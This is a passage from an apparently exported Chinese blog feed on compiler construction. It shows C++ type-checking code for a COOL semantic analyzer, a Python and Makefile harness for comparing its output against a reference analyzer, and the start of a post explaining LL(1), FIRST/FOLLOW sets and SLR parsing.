class="title">int_const_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//无需检查，直接添加对象即可</span></span><br><span class="line">    class_table-&gt;<span class="built_in">object_add</span>(<span class="built_in">get_token</span>(), Int);</span><br><span class="line">    <span class="built_in">set_type</span>(Int);</span><br><span class="line">    <span class="keyword">return</span> Int;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">bool_const_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//无需检查</span></span><br><span class="line">    <span class="built_in">set_type</span>(Bool);</span><br><span class="line">    <span class="keyword">return</span> Bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">string_const_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//无需检查，直接添加对象即可</span></span><br><span class="line">    class_table-&gt;<span class="built_in">object_add</span>(<span class="built_in">get_token</span>(), Str);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Str);</span><br><span class="line">    <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">new__class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//确保其类型是合法的类型，然后返回即可</span></span><br><span class="line">    Symbol type_name = class_table-&gt;<span class="built_in">lookup_class</span>(<span class="built_in">get_type_name</span>());</span><br><span class="line">    <span class="keyword">if</span>(type_name == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;&#x27;new&#x27; used with undefined class &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_type_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//简单的处理方式</span></span><br><span class="line">        type_name = Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(type_name);</span><br><span class="line">    <span class="keyword">return</span> type_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">isvoid_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查isvoid的表达式，确保其是有效表达式</span></span><br><span class="line">    <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    <span class="built_in">set_type</span>(Bool);</span><br><span class="line">    <span class="keyword">return</span> Bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">no_expr_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 返回No_class，表示该项无类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">set_type</span>(No_type);</span><br><span class="line">    <span class="keyword">return</span> No_class;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">object_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 变量是否被定义</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol symbol = class_table-&gt;<span class="built_in">lookup_object</span>(<span class="built_in">get_name</span>());</span><br><span class="line">    <span class="keyword">if</span>(symbol == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Undeclared identifier &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//简单的处理方式</span></span><br><span class="line">        symbol = Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(symbol);</span><br><span class="line">    <span class="keyword">return</span> symbol;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1: Classes classes        程序的类集合</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 实际上，也就是遍历类的成员方法</span></span><br><span class="line"><span class="comment"> * 检查成员方法中表达式的合法性</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 也就是通过在Feature、Expression_class和Case_class中实现check_type()方法</span></span><br><span class="line"><span class="comment"> * 从而实现类型检查和类型推断功能</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 之后只要在每一个Feature中调用check_type，其会递归的调用check_type，从而完成最终的类型检查</span></span><br><span class="line"><span class="comment"> * 这里调用check_type时，其预期的返回值类型总是Object(从而兼容绝大多数的返回值类型)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::check_types</span><span class="params">(Classes classes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = classes-&gt;<span class="built_in">first</span>(); classes-&gt;<span class="built_in">more</span>(i); i = classes-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line"></span><br><span class="line">        Class_ class_ = classes-&gt;<span class="built_in">nth</span>(i);</span><br><span class="line">        Features features = class_-&gt;<span class="built_in">get_features</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">enter_scope</span>(class_-&gt;<span class="built_in">get_name</span>());</span><br><span class="line">        <span class="built_in">object_enter_scope</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = features-&gt;<span class="built_in">first</span>(); features-&gt;<span class="built_in">more</span>(j); j = features-&gt;<span class="built_in">next</span>(j)) &#123; features-&gt;<span class="built_in">nth</span>(j)-&gt;<span class="built_in">check_type</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">        <span class="built_in">object_exit_scope</span>();</span><br><span class="line">        <span class="built_in">exit_scope</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ClassTable::<span class="built_in">ClassTable</span>(Classes classes) : <span class="built_in">semant_errors</span>(<span class="number">0</span>) , <span class="built_in">error_stream</span>(cerr) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查变量类型信息 */</span></span><br><span class="line">  <span class="built_in">check_types</span>(classes);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="cmp-py"><a href="#cmp-py" class="headerlink" title="cmp.py"></a>cmp.py</h3><p>  为了观察自己实现的语义解析程序的效果，通过与标准的语义解析器的输出进行比较来实现<br>  和之前略微不同的是——标准语义分析器可能分析出一部分错误信息后，认为后续步骤无需进行；而自己实现的语义分析器会接着执行后续的分析步骤，从而导致输出更多的信息<br>  虽然如此，标准语义分析的输出一定需要包含在自己实现的语义分析的输出中。最终代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">参数1：            path         字符串，表明要读取的文件路径</span></span><br><span class="line"><span class="string">返回值：                        列表，每一个元素表示一行的信息</span></span><br><span class="line"><span class="string">读取制定文件的语义解析结果</span></span><br><span class="line"><span class="string">即通过正则表达式，过滤^\s*#[0-9]+\s*$的输入即可，其每一行的信息为(行号，内容)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_semant_result</span>(<span class="params">path</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):</span><br><span class="line">            result = re.<span class="keyword">match</span>(<span class="string">r&#x27;^\s*#[0-9]+\s*$&#x27;</span>, lines[i])</span><br><span class="line">            <span class="keyword">if</span>(result == <span class="literal">None</span>):</span><br><span class="line">                res.append([i, lines[i][:-<span class="number">1</span>]])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>):</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        sys.argv[1]表示原始文件名称</span></span><br><span class="line"><span class="string">        sys.argv[2]表示标准语义解析器的结果</span></span><br><span class="line"><span class="string">        sys.argv[3]表示自己实现的语义解析器的结果</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    semant_output = read_semant_result(sys.argv[<span class="number">2</span>])</span><br><span class="line">    mysemant_output = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> read_semant_result(sys.argv[<span class="number">3</span>]):</span><br><span class="line">        mysemant_output.add(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    same_number = <span class="number">0</span></span><br><span class="line">    diff_result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(semant_output)):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>(semant_output[i]) <span class="keyword">in</span> mysemant_output):</span><br><span class="line">            same_number += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            diff_result.append([semant_output[i][<span class="number">0</span>], semant_output[i][<span class="number">1</span>], <span class="string">&#x27;empty&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[32;1m%s: %d/%d\033[0m&quot;</span>%(sys.argv[<span class="number">1</span>], same_number, <span class="built_in">len</span>(semant_output)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(diff_result)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;#%s: \033[32;1msemant_output: %s; \033[31;1mmysemant_output: %s\033[0m&#x27;</span>%(diff_result[i][<span class="number">0</span>], diff_result[i][<span class="number">1</span>], diff_result[i][<span class="number">2</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>  更改<strong>Makefile</strong>中的<strong>doteset</strong>目标<br>  分别调用自己实现的语义解析器和标准的语义解析器，处理<strong>./*cl</strong>和<strong>../../examples/*cl</strong>，并调用前面实现的<strong>cmp.py</strong>，比较输出结果，从而进行测试</p><p>  修改的<strong>Makefile</strong>目标如下所示<br>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">dotest:semant good.cl bad.cl</span></span><br><span class="line">for file in $<span class="variable">$(find ../../examples/*.cl; find ./*.cl | grep -v bad.cl)</span>; do \</span><br><span class="line">basename=$<span class="variable">$(echo $$<span class="built_in">file</span> | awk -F / &#x27;&#123;print $$NF&#125;&#x27; | awk -F . &#x27;&#123;print $$1&#125;&#x27;)</span>; \</span><br><span class="line">../../bin/lexer $$file | ../../bin/parser | ../../bin/semant &gt; $$basename.semant 2&gt;/dev/null; \</span><br><span class="line">./mysemant $$file &gt; my$$basename.semant 2&gt;/dev/null; \</span><br><span class="line">python3 cmp.py $$basename $$basename.semant my$$basename.semant; \</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for file in $<span class="variable">$(find ./*.cl | grep bad.cl)</span>; do \</span><br><span class="line">basename=$<span class="variable">$(echo $$<span class="built_in">file</span> | awk -F / &#x27;&#123;print $$NF&#125;&#x27; | awk -F . &#x27;&#123;print $$1&#125;&#x27;)</span>; \</span><br><span class="line">../../bin/lexer $$file | ../../bin/parser | ../../bin/semant 2&gt;$$basename.semant; \</span><br><span class="line">./mysemant $$file 2&gt;my$$basename.semant; \</span><br><span class="line">echo -n <span class="string">&quot;\e[32;1m$$basename: &quot;</span>; echo -n `grep -wf $$basename.semant my$$basename.semant | wc -l`; echo -n <span class="string">&quot; / &quot;</span>; echo <span class="string">&quot;`cat $$basename.semant | wc -l`\e[0m&quot;</span>; \</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>  最终，其运行结果如下所示<br>  <img src="实验结果.png" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理-设计与实现-二</title>
      <link href="/2022/01/24/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%BA%8C/"/>
      <url>/2022/01/24/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  本篇博客记录<strong>语法分析</strong>部分，并且完成<strong>Programming Assignment III</strong></p><h2 id="Syntax-Analysis-Parsing"><a href="#Syntax-Analysis-Parsing" class="headerlink" title="Syntax Analysis/Parsing"></a>Syntax Analysis/Parsing</h2><p>  语法分析是编译器的第二个阶段。语法分析器从词法分析器获得一个由词法单元组成的串，并验证这个串可以由源语言的文法生成</p><h2 id="Context-Free-Grammars"><a href="#Context-Free-Grammars" class="headerlink" title="Context-Free Grammars"></a>Context-Free Grammars</h2><p>  一个上下文无关文法由以下几个部分构成</p><ol><li>一个<strong>终结符号</strong>集合。在编译器的例子中，就是<strong>词法分析器</strong>输出的<strong>词法单元</strong>集合</li><li>一个<strong>非终结符</strong>集合。每个<strong>非终结符</strong>表示一个<strong>终结符号</strong>串的集合</li><li>一个<strong>产生式</strong>集合。其中每个<strong>产生式</strong>由如下元素组成：<ul><li>一个称为<strong>产生式头</strong>或<strong>左部</strong>的非终结符号</li><li>一个箭头<script type="math/tex">\rightarrow</script></li><li>一个称为<strong>产生式体</strong>或<strong>右部</strong>的，由<strong>终结符号</strong>和<strong>非终结符号</strong>组成的序列</li></ul></li><li><p>指定一个<strong>非终结符号</strong>为<strong>开始符号</strong></p><p>上下文无关文法的表达能力比正则表达式更强——每个可以使用正则表达式描述的构造都可以使用上下文无关文法描述，但反过来不成立。诸如<strong>括号嵌套匹配</strong>等问题，上下文无关文法可以解决，然而正则表达式无法解决<br>虽然如此，其在处理不同问题时有不同优势。在编译器的例子中，<strong>正则表达式</strong>适合描述诸如标识符、常量、关键字、空白这样的语言构造的结构，也就是<strong>词法分析</strong>；而<strong>上下文无关文法</strong>适合描述诸如对称的括号匹配、匹配的begin-end、相互对应的if-then-else等，也就是<strong>语法分析</strong>。</p><p>目前，主流的处理<strong>上下文无关文法</strong>的方式有以下两种</p></li></ol><ul><li>Top-Down Parsing，即自顶向下</li><li>Bottom-Up Parsing，即自底向上</li></ul><h3 id="Top-Down-Parsing"><a href="#Top-Down-Parsing" class="headerlink" title="Top-Down Parsing"></a>Top-Down Parsing</h3><p>  实际上，<strong>自顶向下</strong>语法分析，可以被看作是为<strong>输入串</strong>构造语法分析树，也可以看作寻找输入串的<strong>最左推导</strong>的过程<br>  其中，最常用的是<strong>LL(1)</strong>算法进行处理，即<strong>Left-to-right-scan Leftmost-derivation One-token-lookahead</strong>，其设计<strong>FIRST</strong>集合和<strong>FOLLOW</strong>集合</p><h4 id="FIRST集合"><a href="#FIRST集合" class="headerlink" title="FIRST集合"></a>FIRST集合</h4><p>  $FIRST(A)$被定义为可从<script type="math/tex">A</script>推导得到的<strong>串</strong>的首符号的集合，其中<script type="math/tex">A</script>是任意的<strong>非终结符号</strong></p><p>  也就是对于任意的<strong>非终结符号</strong><script type="math/tex">A</script>，<script type="math/tex">FIRST(A) = \{t|A \stackrel{*}{\rightarrow} t\omega, \omega为任意符号\}</script></p><p>  遍历<strong>非终结符号</strong><script type="math/tex">A</script>的所有的<strong>产生式</strong>，并通过如下步骤计算<script type="math/tex">FIRST(A)</script></p><ul><li>若有<script type="math/tex">A \rightarrow \alpha</script>，则有<script type="math/tex">FIRST(A) = FIRST(A) \cup \{\alpha\}</script></li><li>若有<script type="math/tex">A \rightarrow \alpha B，B为任意符号</script>，则有<script type="math/tex">FIRST(A) = FIRST(A) \cup \{\alpha\}</script></li></ul><h4 id="FOLLOW集合"><a href="#FOLLOW集合" class="headerlink" title="FOLLOW集合"></a>FOLLOW集合</h4><p>  $FOLLOW(A)$被定义为可能在某些句型中紧跟在<script type="math/tex">A</script>右边的终结符号的集合，其中<script type="math/tex">A</script>是任意的<strong>非终结符号</strong></p><p>  也就是对于任意的<strong>非终结符号</strong><script type="math/tex">A</script>，<script type="math/tex">FOLLOW(A) = \{t|A \stackrel{*}{\rightarrow} \alpha At \omega, \alpha、\omega为任意符号\}</script></p><p>  遍历所有的<strong>产生式</strong>，并通过如下步骤计算<script type="math/tex">FOLLOW(A)</script></p><ul><li>若有<script type="math/tex">B \rightarrow \alpha At \omega，\alpha、\omega为任意符号</script>，则有<script type="math/tex">FOLLOW(A) = FOLLOW(A) \cup \{t\}</script></li><li>若有<script type="math/tex">B \rightarrow \alpha A \omega，\alpha为任意符号，\omega为非终结符号</script>，则有<script type="math/tex">FOLLOW(A) = FOLLOW(A) \cup FIRST(\omega)</script></li><li>若有<script type="math/tex">B \rightarrow \alpha A \omega，\alpha为任意符号，\omega为非终结符号</script>，且<script type="math/tex">\epsilon \in FIRST(\omega)</script>，则有<script type="math/tex">FOLLOW(A) = FOLLOW(A) \cup FOLLOW(B)</script></li></ul><h4 id="LL-1-表"><a href="#LL-1-表" class="headerlink" title="LL(1)表"></a>LL(1)表</h4><p>  实际上，并非任意上下文无关文法都可以使用<strong>LL(1)</strong>算法。对于文法<strong>G</strong>，其需要满足如下条件</p><ol><li>对于<strong>G</strong>的任意两个不同的产生式<script type="math/tex">A \rightarrow \alpha | \beta</script>，不存在<strong>终结符号</strong>a，使得<script type="math/tex">\alpha</script>和<script type="math/tex">\beta</script>都能够推导出以a开头的串</li><li>对于<strong>G</strong>的任意两个不同的产生式<script type="math/tex">A \rightarrow \alpha | \beta</script>，最多只有一个可以推导出空串</li><li><p>对于<strong>G</strong>的任意两个不同的产生式<script type="math/tex">A \rightarrow \alpha | \beta</script>。如果<script type="math/tex">\beta \stackrel{*}{\rightarrow} \epsilon</script>，那么a不能推导出任何以<script type="math/tex">FOLLOW(A)</script>中某个<strong>终结符号</strong>开头的串</p><p>实际上，通过上述条件的约束，其确保了对于任意两个不同的产生式<script type="math/tex">A \rightarrow \alpha | \beta</script>，<script type="math/tex">FIRST(A) \cap FIRST(B) = \varnothing</script>。<br>也就是仅仅通过判断紧挨着的<strong>一个</strong>输入字符，即可<strong>唯一</strong>选择一个产生式并进行推导，也就是可以<strong>查表</strong>实现推导规则的选择</p><p>而<strong>LL(1)</strong>的表可以通过如下规则，构造文法<strong>G</strong>的表<strong>M</strong>:<br>对于文法<strong>G</strong>的每个产生式<script type="math/tex">A \rightarrow \alpha</script></p></li><li>对于<script type="math/tex">FIRST(\alpha)</script>中的每一个终结符号a，将<script type="math/tex">A \rightarrow \alpha</script>加入到<strong>M[A, a]</strong>中</li><li>如果<script type="math/tex">\epsilon \in FIRST(\alpha)</script>，则对于<script type="math/tex">FOLLOW(A)</script>中的每个终结符号b，将<script type="math/tex">A \rightarrow \alpha</script>加入到<strong>M[A, b]</strong>中</li><li><p>如果<script type="math/tex">\epsilon \in FIRST(\alpha)</script>，且<script type="math/tex">\$ \in FOLLOW(A)</script>，将<script type="math/tex">A \rightarrow \alpha</script>加入到<strong>M[A, $]</strong>中</p><p>当将<strong>LL(1)</strong>表构造出来后，其验证串的算法就非常简单了，算法如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stack &lt;- &#123;&#125;</span><br><span class="line">while(stack.size()) &#123;</span><br><span class="line">    if(stack.top() is terminal) &#123;</span><br><span class="line">        if(stack.pop() == *input++) &#123;&#125;</span><br><span class="line">        else &#123;error();&#125;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        if(M[stack.top(), *input]) &#123;</span><br><span class="line">            stack.push(M[stack.pop(), *input]);</span><br><span class="line">        &#125;else &#123;error();&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="LL1样例.png" alt="LL1样例"></p></li></ol><h3 id="Bottom-Up-Parsing"><a href="#Bottom-Up-Parsing" class="headerlink" title="Bottom-Up Parsing"></a>Bottom-Up Parsing</h3><p>  简单来说，可以将<strong>自底向上</strong>语法分析过程看成将一个串<script type="math/tex">\omega</script><strong>规约</strong>为上下文无关文法的开始符号的过程，也可以看作寻找输入串<strong>最右推导</strong>的逆向过程<br>  实践中使用<strong>LR(0)</strong>语法分析器，即<strong>Left-to-right-scan Rightmost-derivation Zero-token-lookahead</strong>，实现自底向上的语法分析，这里简单讲解<strong>LR(0)</strong>语法分析技术，其涉及到<strong>Shift-Reduce Parsing</strong>、<strong>CLOSURE</strong>、<strong>GOTO</strong>、<strong>Simple LR</strong>等概念</p><h4 id="Shift-Reduce-Parsing"><a href="#Shift-Reduce-Parsing" class="headerlink" title="Shift-Reduce Parsing"></a>Shift-Reduce Parsing</h4><p>  <strong>移入-规约语法分析技术</strong>是自底向上语法分析的通用框架，由以下几个部分构成:</p><ol><li>一个<strong>栈</strong>，其用来保存上下文无关文法的<strong>符号</strong></li><li>一个<strong>输入缓冲区</strong>，即存放将要进行分析的上下文无关文法的<strong>终结符号</strong></li><li><p>一系列<strong>操作</strong></p><ul><li><strong>移入(Shift)</strong>：将下一个<strong>输入缓冲区</strong>的输入符号移动到<strong>栈</strong>顶</li><li><strong>规约(Reduce)</strong>：将从栈顶开始的与某个<strong>产生式体</strong>匹配的子串<strong>出栈</strong>，并且将该<strong>产生式头</strong>入栈</li><li>接受：当栈中只含有上下文无关文法的<strong>开始符号</strong>时，则分析过程成功</li><li>报错：即<strong>输入缓冲区</strong>无输入，且无法进行<strong>规约</strong>操作</li></ul><p><img src="Shift-Reduce样例.png" alt="Shift-Reduce样例"></p><p>因此，关键问题在于<strong>何时</strong>进行规约以及应用<strong>哪个</strong>产生式进行规约。可以通过<strong>CLOSURE</strong>、<strong>GOTO</strong>集合生成一个<strong>LR</strong>表，从而解决问题。</p></li></ol><h4 id="CLOSURE"><a href="#CLOSURE" class="headerlink" title="CLOSURE"></a>CLOSURE</h4><p>  通过对上下文无关文法的<strong>产生式</strong>的<strong>体</strong>中添加点，从而生成所谓的<strong>Item(项)</strong><br>  <img src="拓广文法item样例.png" alt="拓广文法 item样例"></p><p>  而基于项的集合<script type="math/tex">I</script>，可以根据如下规则定义项集的闭包<script type="math/tex">CLOSURE(I)</script></p><ol><li>将<script type="math/tex">I</script>的各个项加入到<script type="math/tex">CLOSURE(I)</script></li><li><p>如果<script type="math/tex">A \rightarrow \alpha \cdot B \beta \in CLOSURE(I)</script>，<script type="math/tex">B \rightarrow \gamma</script>是一个产生式，并且项<script type="math/tex">B \rightarrow \cdot \gamma \notin CLOSURE(I)</script>中，则将<script type="math/tex">B \rightarrow \cdot \gamma</script>加入到<script type="math/tex">CLOSURE(I)</script>。不断应用这个规则，直到没有新项可以加入为止</p><p>实际上，对于<script type="math/tex">A \rightarrow \alpha \cdot B \beta \in CLOSURE(I)</script>，则认为接下来在输入中需要看到一个能够从<script type="math/tex">B \beta</script>推导的子串，也就是必然会用到<script type="math/tex">B</script>的产生式，将其加入到<script type="math/tex">CLOSURE(I)</script>中，从而得到基于该上下文无关文法的完备项集</p></li></ol><h4 id="GOTO"><a href="#GOTO" class="headerlink" title="GOTO"></a>GOTO</h4><p>  $GOTO(I,X)$用于定义上下文无关文法的状态转换。其中<script type="math/tex">I</script>是一个项集；<script type="math/tex">X</script>是上下文无关文法的符号</p><p>  则<script type="math/tex">GOTO(I, X) = \cup CLOSURE(\{[A \rightarrow \alpha X \cdot \beta] | [A \rightarrow \alpha \cdot X \beta] \in I\})</script></p><h4 id="Simple-LR"><a href="#Simple-LR" class="headerlink" title="Simple LR"></a>Simple LR</h4><p>  类似于<strong>LL(1)</strong>，<strong>SLR</strong>同样可以构造一个分析表，从而根据该表完成上下文无关文法的识别</p><p>  通过如下规则，可以将一个上下文无关文法<strong>G</strong>，转换成<strong>SLR</strong>的表<script type="math/tex">ACTION</script>和<script type="math/tex">GOTO^{'}</script></p><ol><li>在<strong>G</strong>中，添加新的开始符号<script type="math/tex">S^{'}</script>，构成增广文法<script type="math/tex">G^{'}</script></li><li>按照下列算法，构造<script type="math/tex">G^{'}</script>的规范<strong>LR(0)</strong>项集族<script type="math/tex">C = \{I_{0}, I_{1}, \cdots, I_{n}\}</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C = &#123;CLOSURE(&#123;S&#x27; -&gt; .S&#125;)&#125;</span><br><span class="line">while(true) &#123;</span><br><span class="line">  for(I in C) &#123;</span><br><span class="line">    for(X : 上下文无关文法符号) &#123;</span><br><span class="line">      if(GOTO(I, X)非空 &amp;&amp; GOTO(I, X)不在C) &#123;</span><br><span class="line">        C.append(GOTO(I, X))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>根据<script type="math/tex">I_{i}</script>构造得到状态<script type="math/tex">i</script><ul><li>如果<script type="math/tex">[A \rightarrow \alpha \cdot a \beta] \in I_{i}</script>，且<script type="math/tex">GOTO(I_{i}, a) = I_{j}</script>，则令<script type="math/tex">ACTION[i, a] = S_{j}</script>，其中a为<strong>G</strong>的终结符号。也就是接受输入a，并且移动到j状态</li><li>如果<script type="math/tex">[A \rightarrow \alpha \cdot] \in I_{i}</script>，那么对于所有的<script type="math/tex">FOLLOW(A)</script>中所有终结符号a，令<script type="math/tex">ACTION[i, a] = R_{A \rightarrow \alpha}</script>，其中<script type="math/tex">A \neq S^{'}</script></li><li>如果<script type="math/tex">[S^{'} \rightarrow S \cdot] \in I_{i}</script>，则令<script type="math/tex">ACTION[i, \$] = AC</script></li></ul></li><li>对于状态i的非终结符号A，如果<script type="math/tex">GOTO(I_{i}, A) = I_{j}</script>，则<script type="math/tex">GOTO^{'}[i, A] = j</script></li><li><p>规则(3)和(4)剩余的条目设置为ERR</p><p>当获取了<strong>SLR</strong>的分析表后，可以使用如下算法，即基于<strong>查找分析表</strong>的<strong>移入-规约语法分析</strong>过程来判断是否为上下文无关文法语句</p><figure class="highlight 